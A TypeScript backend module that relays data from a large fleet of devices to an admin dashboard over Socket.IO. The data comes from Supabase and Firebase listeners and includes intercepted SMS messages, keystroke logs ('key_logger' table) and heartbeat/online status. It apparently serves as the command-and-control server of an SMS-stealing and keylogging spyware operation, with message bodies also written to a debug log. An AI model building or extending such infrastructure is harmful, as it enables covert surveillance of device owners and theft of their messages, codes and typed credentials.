import { createClient, SupabaseClient } from '@supabase/supabase-js';
import * as admin from 'firebase-admin';
import config from '../config/env';
import logger from '../utils/logger';
import { getIo } from '../socket';
import * as fs from 'fs';
import * as path from 'path';

const DEBUG_LOG_PATH = path.join(process.cwd(), 'realtime-debug.log');

/**
 * Realtime Registry
 * Centralized server-side realtime listeners to reduce client-side overhead
 * Supports 100k+ devices by shifting subscription logic to the backend
 */
export class RealtimeRegistry {
    private supabase: SupabaseClient;
    private firebaseAdmin: admin.app.App | null = null;
    private isInitialized = false;
    private universalDbUrl: string | null = null;
    private staleCheckInterval: NodeJS.Timeout | null = null;
    private configSyncInterval: NodeJS.Timeout | null = null;
    private firebaseListenersActive = false;

    private systemConfig = {
        mqttEnabled: true,
        relayEnabled: true,
        staleCheckEnabled: true,
        firebaseUniversalEnabled: true,
        highScaleMode: false
    };

    private eventBuffer: {
        deviceUpdates: any[];
        messageUpdates: any[];
    } = { deviceUpdates: [], messageUpdates: [] };
    private flushInterval: NodeJS.Timeout | null = null;

    constructor() {
        this.supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

        if (config.firebase.serviceAccount) {
            try {
                if (admin.apps.length === 0) {
                    this.firebaseAdmin = admin.initializeApp({
                        credential: admin.credential.cert(config.firebase.serviceAccount)
                    });
                } else {
                    this.firebaseAdmin = admin.app();
                }
            } catch (err: any) {
                logger.error('Failed to initialize Firebase Admin for RealtimeRegistry:', err.message);
            }
        }

        // Start Event Flusher (Batching)
        this.startEventFlusher();
    }

    private startEventFlusher() {
        if (this.flushInterval) clearInterval(this.flushInterval);
        this.flushInterval = setInterval(() => this.flushEvents(), 1000); // Flush once per second
    }

    private flushEvents() {
        try {
            const io = getIo();

            // 1. Flush Device Updates
            if (this.eventBuffer.deviceUpdates.length > 0) {
                const batch = [...this.eventBuffer.deviceUpdates];
                this.eventBuffer.deviceUpdates = [];

                // Emit bulk update to admin rooms
                io.to('admin-dashboard').emit('bulk_device_change', batch);

                // If not in high-scale, also emit to global room (legacy support)
                if (!this.systemConfig.highScaleMode) {
                    io.emit('bulk_device_change', batch);
                }
            }

            // 2. Flush Message Updates
            if (this.eventBuffer.messageUpdates.length > 0) {
                const batch = [...this.eventBuffer.messageUpdates];
                this.eventBuffer.messageUpdates = [];

                io.to('admin-messages').emit('bulk_message_change', batch);

                if (!this.systemConfig.highScaleMode) {
                    io.emit('bulk_message_change', batch);
                }
            }
        } catch (err) {
            logger.error('[RealtimeRegistry] Event flushing failed:', err);
        }
    }

    async init() {
        if (this.isInitialized) return;

        fs.appendFileSync(DEBUG_LOG_PATH, `[${new Date().toISOString()}] Registry INIT started\n`);
        logger.info('Initializing RealtimeRegistry global listeners...');

        // 1. Fetch Universal Firebase Database URL from global_config
        try {
            const { data: globalProviderRow } = await this.supabase
                .from('global_config')
                .select('config_value')
                .eq('config_key', 'app_builder_db_provider_config')
                .maybeSingle();

            const globalProviderConfig = globalProviderRow?.config_value as any;
            if (globalProviderConfig?.firebase?.databaseUrl) {
                this.universalDbUrl = globalProviderConfig.firebase.databaseUrl;
                logger.info(`[RealtimeRegistry] Universal Firebase URL found: ${this.universalDbUrl}`);
            }
        } catch (err: any) {
            logger.error('Failed to fetch universal firebase config:', err.message);
        }

        // 2. Setup Supabase Global Listeners
        this.setupSupabaseListeners();

        // 3. Setup Universal Firebase Global Listeners
        if (this.firebaseAdmin && this.universalDbUrl) {
            const project = this.firebaseAdmin.options.credential ? (this.firebaseAdmin.options as any).projectId : 'unknown';
            logger.info(`[RealtimeRegistry] Firebase Admin project: ${project}`);
            // setupFirebaseListeners now called by syncSystemConfig based on flag
        } else {
            logger.warn('[RealtimeRegistry] Firebase Admin or Universal URL missing. Firebase relay INACTIVE.');
        }

        this.isInitialized = true;

        // 4. Start Stale Device Cleanup (marks devices as offline if last_seen > 5m)
        this.startStaleCheck();

        // 5. Start Config Sync (Refresh every 30s)
        this.startConfigSync();
        await this.syncSystemConfig();

        logger.info('RealtimeRegistry initialized successfully');
    }

    private startConfigSync() {
        if (this.configSyncInterval) clearInterval(this.configSyncInterval);
        this.configSyncInterval = setInterval(() => this.syncSystemConfig(), 30000);
    }

    private async syncSystemConfig() {
        try {
            const { data: row } = await this.supabase
                .from('global_config')
                .select('config_value')
                .eq('config_key', 'system_status_config')
                .maybeSingle();

            if (row?.config_value) {
                const newConfig = {
                    ...this.systemConfig,
                    ...(typeof row.config_value === 'string' ? JSON.parse(row.config_value) : row.config_value)
                };

                // Environment variable override for emergency high-scale situations
                if (process.env.HIGH_SCALE_MODE === 'true') {
                    newConfig.highScaleMode = true;
                }

                // Physically toggle Firebase listeners to save costs
                if (newConfig.firebaseUniversalEnabled && !this.firebaseListenersActive) {
                    this.setupFirebaseListeners();
                } else if (!newConfig.firebaseUniversalEnabled && this.firebaseListenersActive) {
                    this.stopFirebaseListeners();
                }

                this.systemConfig = newConfig;
            }
        } catch (err) {
            // Silently fail if DB not ready
        }
    }

    public getSystemConfig() {
        return this.systemConfig;
    }

    private startStaleCheck() {
        if (this.staleCheckInterval) clearInterval(this.staleCheckInterval);
        this.staleCheckInterval = setInterval(() => this.performStaleCheck(), 60000); // Every minute
    }

    private async performStaleCheck() {
        if (!this.systemConfig.staleCheckEnabled) return;

        try {
            const staleThreshold = new Date(Date.now() - 10 * 60 * 1000).toISOString();

            // Mark devices as offline if they haven't been seen for 5+ minutes
            const { data, error } = await this.supabase
                .from('devices')
                .update({ status: false })
                .eq('status', true)
                .lt('last_seen', staleThreshold)
                .select('device_id');

            if (error) throw error;

            if (data && data.length > 0) {
                logger.info(`[RealtimeRegistry] Marked ${data.length} stale devices as offline`);
                data.forEach((d: any) => {
                    this.relayDeviceUpdate({ device_id: d.device_id, status: false });
                });
            }
        } catch (err: any) {
            logger.error('[RealtimeRegistry] Stale check failed:', err.message);
        }
    }

    private setupSupabaseListeners() {
        logger.info('Setting up Supabase global real-time listeners...');

        this.supabase
            .channel('global-sms')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'sms_messages' }, (payload) => {
                logger.info(`[RealtimeRegistry] Supabase SMS detected for ${payload.new?.device_id || payload.new?.deviceId}`);
                this.relayMessage(payload.new);
            })
            .subscribe((status) => {
                logger.info(`[RealtimeRegistry] Supabase SMS subscription status: ${status}`);
            });

        this.supabase
            .channel('global-devices')
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'devices' }, (payload) => {
                this.relayDeviceUpdate(payload.new);
            })
            .subscribe();

        this.supabase
            .channel('global-keylogs')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'key_logger' }, (payload) => {
                this.relayKeylog(payload.new);
            })
            .subscribe();
    }

    private setupFirebaseListeners() {
        if (!this.firebaseAdmin || !this.universalDbUrl || this.firebaseListenersActive) return;

        // Final guard against starting if disabled
        if (!this.systemConfig.firebaseUniversalEnabled) return;

        try {
            this.firebaseListenersActive = true;
            logger.info(`[RealtimeRegistry] STARTING Firebase Realtime Listeners: ${this.universalDbUrl} (COST INCURRING)`);
            const db = this.firebaseAdmin.database(this.universalDbUrl);

            // Generic listener for messages
            const handleMessageChange = (snapshot: admin.database.DataSnapshot, eventType: string) => {
                const deviceId = snapshot.key;
                logger.info(`[RealtimeRegistry] Firebase SMS ${eventType} signal for device: ${deviceId}`);
                if (!deviceId) return;

                // For child_added (new device) or child_changed (existing device with new message)
                snapshot.ref.limitToLast(1).once('value', (msgSnapshot) => {
                    if (!this.systemConfig.firebaseUniversalEnabled) return;

                    const messages = msgSnapshot.val();
                    if (messages) {
                        const keys = Object.keys(messages);
                        const lastId = keys[keys.length - 1];
                        const lastMsg = messages[lastId];
                        logger.info(`[RealtimeRegistry] Firebase SMS detected from ${deviceId} (event: ${eventType})`);
                        this.relayMessage({ ...lastMsg, device_id: deviceId, id: lastId, _source: 'firebase-universal' });
                    } else {
                        logger.warn(`[RealtimeRegistry] No messages found for ${deviceId} after ${eventType}`);
                    }
                });
            };

            db.ref('sms').on('child_added', (s) => handleMessageChange(s, 'child_added'));
            db.ref('sms').on('child_changed', (s) => handleMessageChange(s, 'child_changed'));

            // Listen for status changes
            const handleStatus = (snapshot: admin.database.DataSnapshot) => {
                const deviceId = snapshot.key;
                if (!deviceId) return;
                const statusValue = snapshot.val();
                const isOnline = statusValue === true || statusValue === 'online';

                if (!this.systemConfig.firebaseUniversalEnabled) return;

                this.relayDeviceUpdate({ device_id: deviceId, status: isOnline });
                this.updateSupabaseDeviceStatus(deviceId, isOnline);
            };

            db.ref('status').on('child_added', handleStatus);
            db.ref('status').on('child_changed', handleStatus);

            // Listen for heartbeat updates
            const handleHeartbeat = (snapshot: admin.database.DataSnapshot) => {
                const deviceId = snapshot.key;
                if (!deviceId) return;
                const hb = snapshot.val();
                if (hb) {
                    if (!this.systemConfig.firebaseUniversalEnabled) return;

                    const lastSeen = new Date().toISOString();
                    this.relayDeviceUpdate({ device_id: deviceId, heartbeat: hb, last_seen: lastSeen });
                    this.updateSupabaseDeviceStatus(deviceId, true, hb);
                }
            };

            db.ref('heartbeat').on('child_added', handleHeartbeat);
            db.ref('heartbeat').on('child_changed', handleHeartbeat);

        } catch (err: any) {
            this.firebaseListenersActive = false;
            logger.error(`[RealtimeRegistry] Firebase listener setup error: ${err.message}`);
        }
    }

    private stopFirebaseListeners() {
        if (!this.firebaseAdmin || !this.universalDbUrl || !this.firebaseListenersActive) return;

        try {
            logger.info(`[RealtimeRegistry] STOPPING Firebase Realtime Listeners to save costs 🛑`);
            const db = this.firebaseAdmin.database(this.universalDbUrl);

            db.ref('sms').off();
            db.ref('status').off();
            db.ref('heartbeat').off();

            this.firebaseListenersActive = false;
        } catch (err: any) {
            logger.error(`[RealtimeRegistry] Error stopping Firebase listeners: ${err.message}`);
        }
    }

    private async updateSupabaseDeviceStatus(deviceId: string, status: boolean, heartbeat?: any) {
        try {
            const updateData: any = {
                status,
                last_seen: new Date().toISOString()
            };

            if (heartbeat) {
                updateData.heartbeat = heartbeat;
            }

            await this.supabase
                .from('devices')
                .update(updateData)
                .eq('device_id', deviceId);
        } catch (err: any) {
            logger.error(`[RealtimeRegistry] Merge status failed for ${deviceId}:`, err.message);
        }
    }

    public relayMessage(msg: any) {
        if (!this.systemConfig.relayEnabled) return;

        try {
            const io = getIo();
            const deviceId = msg.device_id || msg.deviceId;

            const logLine = `[${new Date().toISOString()}] RELAY MESSAGE: Device=${deviceId} ID=${msg.id} Body=${msg.body?.substring(0, 20)}...\n`;
            fs.appendFileSync(DEBUG_LOG_PATH, logLine);

            if (!deviceId) {
                logger.warn('[RealtimeRegistry] Cannot relay message: NO DEVICE ID');
                return;
            }

            const payload = { eventType: 'INSERT', new: { ...msg, device_id: deviceId } };

            // Emit to Global (Skip in High-Scale to save bandwidth)
            if (!this.systemConfig.highScaleMode) {
                io.emit('message_change', payload);
            }

            // Always Emit to Device-Specific Room (Immediate)
            // This is for users looking at a specific device's message list
            io.to(`messages-${deviceId}`).emit('message_change', payload);

            // BATCHED Admin Updates: Only if NOT in high-scale mode
            // This prevents flooding the global admin dashboard with millions of messages
            if (!this.systemConfig.highScaleMode) {
                this.eventBuffer.messageUpdates.push(payload);
            }

            logger.info(`[RealtimeRegistry] Relayed message for ${deviceId} (HighScale: ${this.systemConfig.highScaleMode}).`);
        } catch (err) {
            logger.error(err, '[RealtimeRegistry] Relay error');
        }
    }

    public relayDeviceUpdate(device: any) {
        if (!this.systemConfig.relayEnabled) return;

        try {
            const io = getIo();
            const deviceId = device.device_id || device.id;
            const payload = { eventType: 'UPDATE', new: device };

            if (!this.systemConfig.highScaleMode) {
                io.emit('device_change', payload);
            }

            if (deviceId) {
                // 1. Full update for specific device view (Immediate)
                // This is used when a user has a specific device details page open
                io.to(`device-${deviceId}`).emit('device_change', payload);

                // 2. Light update for Global Admin Dashboard (Batched)
                // We only send ID, Status, and Last Seen to keep the list view fast
                const lightUpdate = {
                    device_id: deviceId,
                    status: device.status,
                    last_seen: device.last_seen || new Date().toISOString()
                };

                this.eventBuffer.deviceUpdates.push({ eventType: 'UPDATE', new: lightUpdate });
            }
        } catch (err) { }
    }

    private relayKeylog(log: any) {
        try {
            const io = getIo();
            const deviceId = log.device_id;
            if (deviceId) {
                io.to(`device-${deviceId}`).emit('keylog_change', { eventType: 'INSERT', new: log });
            }
        } catch (err) { }
    }

    shutdown() {
        if (this.staleCheckInterval) clearInterval(this.staleCheckInterval);
        if (this.configSyncInterval) clearInterval(this.configSyncInterval);
        if (this.flushInterval) clearInterval(this.flushInterval);
        this.stopFirebaseListeners();
        logger.info('[RealtimeRegistry] Registry shut down.');
    }
}

export const realtimeRegistry = new RealtimeRegistry();
